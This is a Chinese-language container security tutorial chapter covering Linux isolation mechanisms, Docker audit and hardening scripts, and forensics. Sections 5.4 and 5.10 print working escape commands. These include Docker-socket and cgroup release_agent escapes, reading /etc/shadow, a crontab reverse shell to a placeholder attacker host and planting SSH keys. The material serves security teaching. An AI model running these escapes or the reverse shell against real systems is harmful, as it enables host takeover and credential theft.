## 案例五：容器安全基础

容器技术（以 Docker 为代表）已成为现代应用部署的标配。然而，容器并非虚拟机——它共享宿主机内核，隔离性远弱于传统虚拟化。理解容器的隔离机制、攻击面和防御策略，是安全从业者的核心技能。本案例从容器隔离原理出发，覆盖安全审计、逃逸攻击、镜像安全、运行时加固和实战攻防的完整知识体系。

### 5.1 容器隔离原理：Linux 内核的三大支柱

容器的隔离能力完全依赖 Linux 内核特性，而非硬件虚拟化。理解这三大支柱是掌握容器安全的基础。

#### 5.1.1 Namespace（命名空间）

Namespace 是容器隔离的核心机制，它将内核全局资源划分为独立的视图。每个容器拥有自己的命名空间，看不到其他容器或宿主机的资源。

Linux 内核提供 8 种命名空间：

| 命名空间 | 隔离内容 | 系统调用标志 | 安全意义 |
|---------|---------|------------|---------|
| **PID** | 进程 ID | `CLONE_NEWPID` | 容器只能看到自己的进程，但宿主机可看到容器进程 |
| **NET** | 网络栈（接口、路由、端口） | `CLONE_NEWNET` | 容器拥有独立网络栈，但可被配置为共享宿主网络 |
| **MNT** | 挂载点 | `CLONE_NEWNS` | 容器有独立文件系统视图，但卷挂载可穿透隔离 |
| **UTS** | 主机名和域名 | `CLONE_NEWUTS` | 容器可设置独立主机名 |
| **IPC** | 进程间通信（信号量、消息队列） | `CLONE_NEWIPC` | 阻断跨容器 IPC |
| **USER** | 用户和组 ID | `CLONE_NEWUSER` | 容器内 root 可映射为宿主机非特权用户 |
| **Cgroup** | Cgroup 根目录 | `CLONE_NEWCGROUP` | 隐藏宿主机 cgroup 层级 |
| **Time** | 系统时钟（Linux 5.6+） | `CLONE_NEWTIME` | 容器可有独立时钟偏移 |

**安全要点：** Namespace 提供的是"视图隔离"而非"资源隔离"。容器内的 root 默认就是宿主机内核的 root——如果没有额外限制，它能调用所有内核系统调用。这正是容器逃逸的根本原因。

查看容器的命名空间信息：

```bash
# 获取容器的 PID
PID=$(docker inspect --format='{{.State.Pid}}' container_name)

# 查看该进程的所有命名空间
ls -la /proc/$PID/ns/

# 输出示例：
# lrwxrwxrwx 1 root root 0 Jun 25 10:00 cgroup -> 'cgroup:[4026532615]'
# lrwxrwxrwx 1 root root 0 Jun 25 10:00 ipc -> 'ipc:[4026532614]'
# lrwxrwxrwx 1 root root 0 Jun 25 10:00 mnt -> 'mnt:[4026532612]'
# lrwxrwxrwx 1 root root 0 Jun 25 10:00 net -> 'net:[4026532616]'
# lrwxrwxrwx 1 root root 0 Jun 25 10:00 pid -> 'pid:[4026532613]'
# lrwxrwxrwx 1 root root 0 Jun 25 10:00 uts -> 'uts:[4026532611]'

# 对比宿主机的命名空间编号，如果相同则说明共享了该命名空间
ls -la /proc/1/ns/
```

#### 5.1.2 Cgroups（控制组）

Cgroups 负责资源限制，控制容器能使用的 CPU、内存、磁盘 I/O 和网络带宽。它不提供隔离，只做资源配额。

```bash
# 查看容器的 cgroup 配置
docker inspect --format='{{.HostConfig.Memory}}' container_name     # 内存限制（字节，0=不限制）
docker inspect --format='{{.HostConfig.CpuShares}}' container_name  # CPU 权重
docker inspect --format='{{.HostConfig.PidsLimit}}' container_name  # PID 数量限制

# 直接查看 cgroup 文件系统
# cgroup v1
cat /sys/fs/cgroup/memory/docker/<container_id>/memory.limit_in_bytes
cat /sys/fs/cgroup/cpu/docker/<container_id>/cpu.shares

# cgroup v2
cat /sys/fs/cgroup/system.slice/docker-<container_id>.scope/memory.max
```

**安全意义：** 如果未设置资源限制，恶意容器可以发起拒绝服务攻击（fork 炸弹耗尽 PID、内存炸弹耗尽 RAM）。生产环境必须设置 `--pids-limit`、`--memory`、`--cpus` 等参数。

#### 5.1.3 Capabilities（能力机制）

Linux 将传统的 root 权限拆分为 40+ 个细粒度的能力（capability）。容器运行时默认授予一组能力，而非全部。理解能力机制是容器逃逸和防御的关键。

```bash
# 查看容器被授予的能力
docker inspect --format='{{.HostConfig.CapAdd}}' container_name   # 额外添加的能力
docker inspect --format='{{.HostConfig.CapDrop}}' container_name  # 显式删除的能力
docker inspect --format='{{.HostConfig.Capabilities}}' container_name  # 实际生效的能力

# 查看容器内进程的能力
# 方法一：在宿主机上
PID=$(docker inspect --format='{{.State.Pid}}' container_name)
cat /proc/$PID/status | grep Cap

# 方法二：在容器内（需要安装 libcap2-bin）
capsh --print

# 查看所有可用能力
capsh --print  # 查看当前系统支持的全部能力
```

关键能力及其安全影响：

| 能力 | 权限 | 被滥用的风险 |
|------|------|-------------|
| `CAP_SYS_ADMIN` | 几乎等同于 root | 挂载文件系统、修改命名空间，最高危能力 |
| `CAP_NET_ADMIN` | 网络管理 | 修改路由、嗅探流量、创建网络接口 |
| `CAP_SYS_PTRACE` | 调试进程 | ptrace 容器内其他进程，注入代码 |
| `CAP_DAC_OVERRIDE` | 绕过文件权限检查 | 读写任意文件 |
| `CAP_SYS_RAWIO` | 原始 I/O | 直接访问块设备 |
| `CAP_NET_RAW` | 原始套接字 | 发送伪造包、ARP 欺骗 |
| `CAP_MKNOD` | 创建设备文件 | 通过 `/dev` 访问宿主机设备 |
| `CAP_SYS_MODULE` | 加载内核模块 | 加载恶意内核模块（极度危险） |
| `CAP_FOWNER` | 绕过文件所有者检查 | 修改任意文件权限 |

**最佳实践：** 使用 `--cap-drop=ALL` 删除所有能力，然后按需添加必要的能力。

### 5.2 Docker Daemon 安全审计

Docker Daemon（dockerd）是容器运行时的核心进程，默认以 root 权限运行。审计其配置是容器安全的第一步。

#### 5.2.1 Daemon 配置检查

```bash
# 查看 Docker daemon 配置文件
cat /etc/docker/daemon.json

# 完整的 daemon.json 安全配置示例
cat > /tmp/daemon-secure.json << 'EOF'
{
    "icc": false,
    "log-driver": "json-file",
    "log-opts": {
        "max-size": "10m",
        "max-file": "3"
    },
    "userns-remap": "default",
    "no-new-privileges": true,
    "live-restore": true,
    "userland-proxy": false,
    "experimental": false,
    "storage-driver": "overlay2",
    "default-ulimits": {
        "nofile": {
            "Name": "nofile",
            "Hard": 65536,
            "Soft": 32768
        }
    }
}
EOF
echo "配置项说明："
echo "  icc=false              禁止容器间直接通信（需通过显式 link 或网络）"
echo "  userns-remap=default   启用用户命名空间映射，容器 root 不是宿主机 root"
echo "  no-new-privileges=true 禁止容器进程获取新权限（防止 setuid 提权）"
echo "  live-restore=true      daemon 重启时容器不中断"
echo "  userland-proxy=false   使用 iptables 而非 userland-proxy 做端口转发"
```

#### 5.2.2 Docker Daemon 运行状态检查

```bash
# 检查 Docker daemon 是否以 root 运行（默认行为，但应关注）
ps aux | grep dockerd | grep -v grep

# 检查 Docker daemon 监听的端口和 socket
ss -tlnp | grep -E '(docker|2375|2376)'
netstat -tlnp 2>/dev/null | grep -E '(docker|2375|2376)'

# 关键警告：如果 Docker daemon 监听 TCP 端口 2375（无 TLS），任何人可以远程控制容器
# 必须使用 TLS 或仅监听 unix socket

# 检查 Docker socket 权限
ls -la /var/run/docker.sock
# 安全要求：仅 root:docker 组可访问
# -rw-rw---- 1 root docker 0 Jun 25 10:00 /var/run/docker.sock

# 查看哪些用户在 docker 组中（有 Docker 访问权限等同于 root）
getent group docker
```

#### 5.2.3 Docker 证书与认证

```bash
# 如果 Docker daemon 使用 TLS，检查证书
ls -la /etc/docker/certs.d/

# 检查 TLS 证书是否过期
openssl x509 -in /etc/docker/server-cert.pem -noout -dates

# 检查 Docker daemon 的 TLS 配置
ps aux | grep dockerd | grep -oE -- '--tls[^ ]*'
# 应该看到 --tlsverify --tlscacert --tlscert --tlskey

# 验证证书链
openssl verify -CAfile /etc/docker/ca.pem /etc/docker/server-cert.pem
```

### 5.3 运行中容器的安全审计

#### 5.3.1 容器特权模式检查

特权容器（`--privileged`）拥有宿主机的全部能力，几乎等同于宿主机 root。这是最危险的容器配置。

```bash
# 检查所有运行中容器的特权状态
echo "=== 容器特权模式检查 ==="
docker ps --format "{{.ID}}\t{{.Names}}" | while read id name; do
    priv=$(docker inspect --format='{{.HostConfig.Privileged}}' "$id")
    pid=$(docker inspect --format='{{.State.Pid}}' "$id")
    if [ "$priv" = "true" ]; then
        echo "[!] 危险: $name ($id) - 特权模式, PID=$pid"
    else
        echo "[+] 正常: $name ($id) - 非特权模式"
    fi
done

# 检查容器是否挂载了敏感路径
echo ""
echo "=== 敏感卷挂载检查 ==="
docker ps --format "{{.ID}}\t{{.Names}}" | while read id name; do
    mounts=$(docker inspect --format='{{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}' "$id")
    echo "容器 $name: $mounts"
    # 标记高危挂载
    echo "$mounts" | grep -qE '(/var/run/docker\.sock|/proc/|/sys/|/dev/|/etc/shadow|/etc/passwd|/$)' && \
        echo "  [!] 警告: 检测到敏感路径挂载！"
done
```

#### 5.3.2 容器能力与安全配置审计

```bash
# 完整的容器安全审计脚本
cat > /tmp/container-audit.sh << 'SCRIPT'
#!/bin/bash
echo "=========================================="
echo "     容器安全审计报告"
echo "     $(date '+%Y-%m-%d %H:%M:%S')"
echo "=========================================="

docker ps --format "{{.ID}}\t{{.Names}}\t{{.Image}}" | while IFS=$'\t' read id name image; do
    echo ""
    echo "--- 容器: $name ($image) ---"
    
    # 特权模式
    priv=$(docker inspect --format='{{.HostConfig.Privileged}}' "$id")
    echo "  特权模式: $priv"
    
    # PID 模式
    pid_mode=$(docker inspect --format='{{.HostConfig.PidMode}}' "$id")
    [ -n "$pid_mode" ] && echo "  [!] PID模式: $pid_mode (共享宿主机PID命名空间)"
    
    # 网络模式
    net_mode=$(docker inspect --format='{{.HostConfig.NetworkMode}}' "$id")
    echo "  网络模式: $net_mode"
    [ "$net_mode" = "host" ] && echo "  [!] 使用宿主机网络，容器间隔离失效"
    
    # 能力
    cap_add=$(docker inspect --format='{{.HostConfig.CapAdd}}' "$id")
    cap_drop=$(docker inspect --format='{{.HostConfig.CapDrop}}' "$id")
    echo "  添加能力: ${cap_add:-无}"
    echo "  删除能力: ${cap_drop:-无}"
    [ "$cap_add" != "[]" ] && [ -n "$cap_add" ] && echo "  [!] 注意: 添加了额外能力"
    
    # 是否以 root 运行
    user=$(docker inspect --format='{{.Config.User}}' "$id")
    echo "  运行用户: ${user:-root}"
    [ -z "$user" ] && echo "  [!] 未指定用户，默认以 root 运行"
    
    # 只读根文件系统
    readonly_fs=$(docker inspect --format='{{.HostConfig.ReadonlyRootfs}}' "$id")
    echo "  只读根文件系统: $readonly_fs"
    
    # 安全配置
    no_new_priv=$(docker inspect --format='{{.HostConfig.SecurityOpt}}' "$id")
    echo "  安全选项: ${no_new_priv:-无}"
    
    # 资源限制
    mem_limit=$(docker inspect --format='{{.HostConfig.Memory}}' "$id")
    cpu_limit=$(docker inspect --format='{{.HostConfig.NanoCpus}}' "$id")
    pids_limit=$(docker inspect --format='{{.HostConfig.PidsLimit}}' "$id")
    echo "  内存限制: $([ "$mem_limit" = "0" ] && echo '未设置' || echo "${mem_limit}字节")"
    echo "  CPU限制: $([ "$cpu_limit" = "0" ] && echo '未设置' || echo "${cpu_limit}纳核")"
    echo "  PID限制: ${pids_limit:-未设置}"
    
    # 容器内进程
    echo "  运行进程:"
    docker top "$id" 2>/dev/null | head -5 | sed 's/^/    /'
done

echo ""
echo "=========================================="
echo "审计完成"
echo "=========================================="
SCRIPT
chmod +x /tmp/container-audit.sh
bash /tmp/container-audit.sh
```

#### 5.3.3 容器网络安全检查

```bash
# 列出所有 Docker 网络
docker network ls

# 检查每个网络的配置
docker network ls --format "{{.Name}}" | while read net; do
    echo "--- 网络: $net ---"
    docker network inspect "$net" --format='
  驱动: {{.Driver}}
  子网: {{range .IPAM.Config}}{{.Subnet}}{{end}}
  网关: {{range .IPAM.Config}}{{.Gateway}}{{end}}
  内部网络: {{.Internal}}
  容器: {{range .Containers}}  {{.Name}}({{.IPv4Address}}){{end}}'
    echo ""
done

# 检查容器端口映射
docker ps --format "{{.ID}}\t{{.Names}}\t{{.Ports}}" | while IFS=$'\t' read id name ports; do
    echo "容器 $name 的端口映射: ${ports:-无}"
    # 检查是否绑定到 0.0.0.0（所有接口）
    echo "$ports" | grep -q "0.0.0.0:" && echo "  [!] 警告: 端口绑定到所有接口"
done
```

### 5.4 容器逃逸攻击技术

容器逃逸是容器安全中最严重的威胁类型——攻击者从容器内部突破隔离，获得宿主机访问权限。

#### 5.4.1 Docker Socket 挂载逃逸

如果容器内挂载了 Docker Socket（`/var/run/docker.sock`），攻击者可以通过它完全控制宿主机上的 Docker daemon。这是最常见的容器逃逸路径之一。

```bash
# 攻击步骤：在容器内检查是否存在 Docker Socket
ls -la /var/run/docker.sock

# 如果存在，安装 Docker CLI（以 Alpine 为例）
apk add docker  # 或 apt-get install docker.io

# 方法一：直接在宿主机上执行命令
docker -H unix:///var/run/docker.sock run -it \
    -v /:/host \
    --privileged \
    alpine \
    chroot /host bash

# 方法二：更隐蔽的方式——创建一个挂载宿主机根目录的容器
docker -H unix:///var/run/docker.sock run -d \
    --name escape \
    --privileged \
    -v /:/host \
    alpine \
    sleep 3600

# 然后进入该容器
docker -H unix:///var/run/docker.sock exec -it escape chroot /host

# 方法三：通过 Docker API（不需要安装 Docker CLI）
# 获取所有容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# 创建一个新容器并挂载宿主机文件系统
curl -s --unix-socket /var/run/docker.sock \
    -X POST http://localhost/containers/create \
    -H "Content-Type: application/json" \
    -d '{
        "Image": "alpine",
        "Cmd": ["sleep", "3600"],
        "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": true
        }
    }'
```

**为什么危险：** Docker Socket 是 Docker daemon 的控制接口。拥有它等于拥有 daemon 的 root 权限，因为 daemon 本身以 root 运行。

#### 5.4.2 特权容器逃逸

特权容器拥有宿主机的全部 capabilities，可以直接访问宿主机设备。

```bash
# 确认当前是特权容器
cat /proc/1/status | grep Cap
# CapEff: 0000003fffffffff 表示所有能力

# 方法一：挂载宿主机磁盘
mkdir -p /tmp/host
# 找到宿主机的根分区
fdisk -l
# 挂载（常见的设备名）
mount /dev/sda1 /tmp/host 2>/dev/null || mount /dev/vda1 /tmp/host 2>/dev/null || mount /dev/mapper/*-root /tmp/host
# 读取宿主机敏感文件
cat /tmp/host/etc/shadow
cat /tmp/host/etc/passwd

# 方法二：通过 /dev 访问宿主机设备
ls /dev/sd*  # 列出宿主机磁盘设备

# 方法三：利用 cgroup 执行命令
# 在特权容器中，可以挂载 cgroup 并利用 notify_on_release 执行任意命令
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

#### 5.4.3 共享命名空间逃逸

当容器与宿主机共享特定命名空间时，可以利用该命名空间的特性进行逃逸。

```bash
# 共享 PID 命名空间逃逸
# 如果容器以 --pid=host 启动，容器可以看到宿主机所有进程
# 配合 nsenter 进入宿主机的其他命名空间
docker run --rm -it --pid=host alpine nsenter -t 1 -m -u -i -n -p -- bash

# 共享网络命名空间
# 如果容器以 --net=host 启动，可以嗅探宿主机流量
tcpdump -i eth0 -w /tmp/capture.pcap

# 利用宿主机进程的 /proc 文件系统
# 当 --pid=host 时，可以通过 /proc/<pid>/root 访问宿主机文件系统
ls /proc/1/root/etc/shadow
```

#### 5.4.4 内核漏洞逃逸

利用宿主机内核漏洞突破容器隔离。历史上影响较大的漏洞包括：

| CVE | 名称 | 影响范围 | 利用方式 |
|-----|------|---------|---------|
| CVE-2016-5195 | Dirty COW | Linux < 4.8.3 | 竞争条件写只读内存映射 |
| CVE-2019-5736 | runc 容器逃逸 | runc < 1.0-rc6 | 覆盖宿主机 runc 二进制 |
| CVE-2020-15257 | containerd 逃逸 | containerd < 1.4.3 | 通过共享主机网络访问 containerd API |
| CVE-2022-0185 | 文件系统堆溢出 | Linux < 5.16.2 | 在特权容器中利用 legacy_parse_param |
| CVE-2022-0492 | cgroup v1 逃逸 | Linux < 5.17 | 利用 release_agent 绕过 user namespace 限制 |

```bash
# 检查宿主机内核版本（判断是否存在已知漏洞）
uname -r
uname -a

# CVE-2019-5736 检查
# 检查 runc 版本
runc --version 2>/dev/null || docker info 2>/dev/null | grep -i runc

# CVE-2022-0185 检查
# 需要特权容器 + 内核版本 < 5.16.2
# 利用 legacy_parse_param 的堆溢出
# 攻击者可在特权容器中利用此漏洞获取宿主机 root

# 防御：保持内核更新是最根本的措施
```

#### 5.4.5 卷挂载逃逸

容器通过卷（volume）挂载宿主机目录时，如果挂载了敏感路径，攻击者可以直接访问宿主机文件系统。

```bash
# 检查容器的卷挂载
docker inspect --format='{{range .Mounts}}
  类型:{{.Type}} 源:{{.Source}} 目标:{{.Destination}} 只读:{{.RW}}
{{end}}' container_name

# 高危挂载示例：
# -v /:/host          挂载宿主机根目录
# -v /var/run/docker.sock:/var/run/docker.sock  挂载 Docker Socket
# -v /etc:/host-etc   挂载宿主机配置目录
# -v /proc:/host-proc 挂载宿主机 proc 文件系统

# 利用挂载的宿主机文件系统写入 crontab 反弹 shell
echo '* * * * * root bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /host/etc/crontab

# 利用挂载的宿主机文件系统写入 SSH 公钥
mkdir -p /host/root/.ssh
echo "attacker_public_key" >> /host/root/.ssh/authorized_keys
```

#### 5.4.6 容器逃逸综合检测

```bash
# 综合逃逸路径检测脚本
cat > /tmp/escape-check.sh << 'SCRIPT'
#!/bin/bash
echo "=== 容器逃逸路径检测 ==="

# 检测 1：Docker Socket
if [ -S /var/run/docker.sock ]; then
    echo "[!!!] 高危: Docker Socket 已挂载到容器内"
fi

# 检测 2：特权模式
if grep -q "CapEff:.*ffffffff" /proc/1/status 2>/dev/null; then
    echo "[!!!] 高危: 容器以特权模式运行"
fi

# 检测 3：宿主机设备
if ls /dev/sd* 2>/dev/null || ls /dev/vd* 2>/dev/null; then
    echo "[!] 警告: 可访问宿主机磁盘设备"
fi

# 检测 4：宿主机文件系统挂载
if mount | grep -q "on /host\|on /mnt/host"; then
    echo "[!] 警告: 宿主机文件系统已挂载"
fi

# 检测 5：共享 PID 命名空间
if [ -f /proc/1/cgroup ] && [ "$(cat /proc/1/cgroup | wc -l)" -eq 0 ]; then
    echo "[!] 警告: 可能共享宿主机 PID 命名空间"
fi

# 检测 6：共享网络命名空间
if [ -f /proc/net/tcp ] && ss -tlnp 2>/dev/null | grep -q ":22\|:2375"; then
    echo "[!] 警告: 检测到宿主机端口，可能共享网络命名空间"
fi

# 检测 7：内核版本
kernel=$(uname -r)
echo "[i] 内核版本: $kernel"

# 检测 8：seccomp 状态
if [ -f /proc/1/status ]; then
    seccomp=$(grep Seccomp /proc/1/status)
    echo "[i] Seccomp: $seccomp"
    echo "$seccomp" | grep -q "0$" && echo "[!] 警告: Seccomp 未启用"
fi

# 检测 9：AppArmor 状态
if [ -f /proc/1/attr/current ]; then
    apparmor=$(cat /proc/1/attr/current)
    echo "[i] AppArmor: $apparmor"
    [ "$apparmor" = "unconfined" ] && echo "[!] 警告: 未受 AppArmor 限制"
fi

# 检测 10：可写 cgroup release_agent
for cg in /sys/fs/cgroup/*/release_agent; do
    if [ -f "$cg" ] && [ -w "$cg" ]; then
        echo "[!!!] 高危: 可写 cgroup release_agent: $cg"
    fi
done

echo "=== 检测完成 ==="
SCRIPT
chmod +x /tmp/escape-check.sh
```

### 5.6 容器运行时安全加固

#### 5.6.1 Seccomp 系统调用过滤

Seccomp（Secure Computing Mode）限制容器可以调用的系统调用，是最有效的运行时安全机制之一。

```bash
# Docker 默认使用 seccomp profile，禁止了约 44 个危险系统调用
# 查看容器的 seccomp 状态
PID=$(docker inspect --format='{{.State.Pid}}' container_name)
grep Seccomp /proc/$PID/status
# Seccomp: 2 表示 seccomp 已启用（filter 模式）
# Seccomp: 0 表示未启用

# 查看默认的 seccomp profile
wget https://raw.githubusercontent.com/moby/moby/master/profiles/seccomp/default.json -O /tmp/default-seccomp.json
cat /tmp/default-seccomp.json | python3 -m json.tool | head -30

# 自定义 seccomp profile 示例：只允许基础系统调用
cat > /tmp/seccomp-strict.json << 'EOF'
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": ["SCMP_ARCH_X86_64"],
    "syscalls": [
        {
            "names": [
                "accept", "access", "arch_prctl", "bind", "brk",
                "clone", "close", "connect", "dup", "dup2",
                "epoll_create", "epoll_ctl", "epoll_wait",
                "execve", "exit", "exit_group",
                "fcntl", "fstat", "futex",
                "getcwd", "getdents", "getpid", "getppid",
                "getsockname", "getsockopt",
                "ioctl", "listen", "lseek",
                "mmap", "mprotect", "munmap",
                "nanosleep", "newfstatat",
                "openat", "pipe", "poll",
                "read", "recvfrom", "recvmsg",
                "rt_sigaction", "rt_sigprocmask",
                "select", "sendmsg", "sendto",
                "set_robust_list", "set_tid_address",
                "socket", "stat", "tgkill",
                "wait4", "write", "writev"
            ],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}
EOF

# 使用自定义 seccomp profile 运行容器
docker run --security-opt seccomp=/tmp/seccomp-strict.json alpine echo "seccomp works"

# 禁用 seccomp（仅调试用，生产环境禁止）
```

### 5.9 容器安全最佳实践清单

#### 5.9.1 镜像安全

- 使用最小基础镜像（`alpine`、`distroless`、`scratch`）
- 固定镜像版本标签，使用 digest 而非 `latest`
- 定期扫描镜像漏洞，集成到 CI/CD 流水线
- 使用多阶段构建减少最终镜像的攻击面
- 不在镜像中硬编码密钥、密码或证书
- 使用 `.dockerignore` 排除敏感文件

#### 5.9.2 运行时安全

- 不使用 `--privileged` 模式
- 使用 `--cap-drop=ALL` 后按需添加能力
- 以非 root 用户运行容器（`USER` 指令或 `--user`）
- 启用只读文件系统（`--read-only`）
- 设置资源限制（内存、CPU、PID）
- 使用 seccomp 和 AppArmor/SELinux 限制系统调用
- 不挂载 Docker Socket
- 使用用户命名空间映射（`--userns-remap`）

#### 5.9.3 网络安全

- 使用自定义桥接网络而非默认 bridge
- 禁用容器间通信（`--icc=false`）
- 不使用 `--net=host` 模式
- 仅暴露必要的端口，绑定到特定接口
- 使用网络策略（Kubernetes NetworkPolicy）限制流量

#### 5.9.4 日志与监控

- 配置容器日志驱动和日志轮转
- 监控容器内的异常进程和网络行为
- 审计 Docker daemon 的 API 调用
- 定期检查运行中容器的安全配置

### 5.10 实战案例：攻击与防御

#### 5.10.1 攻击场景：利用特权容器获取宿主机权限

```bash
# 场景：获得了一个特权容器的 shell
# 目标：获取宿主机的 root 权限

# 步骤 1：确认特权模式
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff

# 步骤 2：找到宿主机根分区设备
fdisk -l 2>/dev/null
mount | grep "on / "

# 步骤 3：挂载宿主机文件系统
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null

# 步骤 4：写入 SSH 公钥
mkdir -p /mnt/host/root/.ssh
echo "ssh-ed25519 AAAA... attacker@evil" >> /mnt/host/root/.ssh/authorized_keys
chmod 600 /mnt/host/root/.ssh/authorized_keys

# 步骤 5：SSH 登录宿主机
# ssh root@宿主机IP
```

#### 5.10.2 防御场景：加固 Docker 环境

```bash
# 完整的加固脚本
cat > /tmp/docker-hardening.sh << 'SCRIPT'
#!/bin/bash
echo "=== Docker 环境加固 ==="

# 1. 确保 Docker daemon 不监听 TCP
if grep -q "tcp://" /etc/docker/daemon.json 2>/dev/null; then
    echo "[!] 发现 TCP 监听，建议仅使用 unix socket 或启用 TLS"
fi

# 2. 设置文件权限
chmod 660 /var/run/docker.sock

# 3. 启用用户命名空间映射
if ! grep -q "userns-remap" /etc/docker/daemon.json 2>/dev/null; then
    echo "[!] 建议启用 userns-remap"
fi

# 4. 检查并停止特权容器
docker ps --format "{{.Names}}" | while read name; do
    priv=$(docker inspect --format='{{.HostConfig.Privileged}}' "$name")
    if [ "$priv" = "true" ]; then
        echo "[!] 特权容器: $name — 建议停止或重新配置"
    fi
done

# 5. 检查镜像漏洞
docker images --format "{{.Repository}}:{{.Tag}}" | while read img; do
    echo "扫描镜像: $img"
    trivy image --severity HIGH,CRITICAL --exit-code 0 "$img" 2>/dev/null
done

# 6. 清理悬空镜像和停止的容器
docker system prune -f
echo "[+] 已清理未使用的资源"

echo "=== 加固完成 ==="
SCRIPT
chmod +x /tmp/docker-hardening.sh
```

### 5.11 常见误区与纠正

| 误区 | 事实 | 正确做法 |
|------|------|---------|
| 容器等同于虚拟机，隔离性很强 | 容器共享宿主机内核，隔离性远弱于 VM | 不要在容器中运行不可信代码，配合 seccomp 和 namespace 加固 |
| `--privileged` 只是权限高一点 | 特权容器等同于宿主机 root | 生产环境永远不使用 `--privileged` |
| 容器内 root 无害 | 默认情况下容器 root 就是宿主机 root | 使用非 root 用户运行容器 |
| latest 标签会自动更新 | latest 是一个普通标签，不会自动跟踪最新版本 | 使用固定版本号或 digest |
| 容器不需要杀毒软件 | 容器可能被植入恶意软件 | 定期扫描镜像，监控运行时行为 |
| 只要不用特权就安全 | 共享命名空间、卷挂载、Docker Socket 都能导致逃逸 | 全面审计所有安全配置 |
| 默认 Docker 网络足够安全 | 默认 bridge 网络允许容器间通信 | 使用自定义网络并禁用 ICC |

### 5.12 进阶：容器逃逸检测与取证

#### 5.12.1 逃逸痕迹检测

```bash
# 如果怀疑容器已经逃逸，在宿主机上进行取证

# 检查是否有异常的宿主机进程来自容器命名空间
ps -eo pid,user,args | grep -v grep | while read pid user args; do
    ns=$(ls -la /proc/$pid/ns/pid 2>/dev/null | awk -F: '{print $NF}' | tr -d ']')
    init_ns=$(ls -la /proc/1/ns/pid 2>/dev/null | awk -F: '{print $NF}' | tr -d ']')
    if [ "$ns" != "$init_ns" ] && [ -n "$ns" ]; then
        echo "[!] PID $pid ($user: $args) 运行在不同的 PID 命名空间"
    fi
done

# 检查可疑的 crontab 条目
grep -r "docker\|container\|/tmp/" /etc/cron* 2>/dev/null

# 检查可疑的 SSH 密钥
find /root/.ssh /home/*/.ssh -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# 检查最近修改的文件
find / -newer /etc/hostname -type f -mtime -1 2>/dev/null | grep -v -E '(/proc|/sys|/dev)'

# 检查 Docker daemon 日志
journalctl -u docker --since "24 hours ago" | grep -iE '(create|exec|attach|mount|privileged)'
```
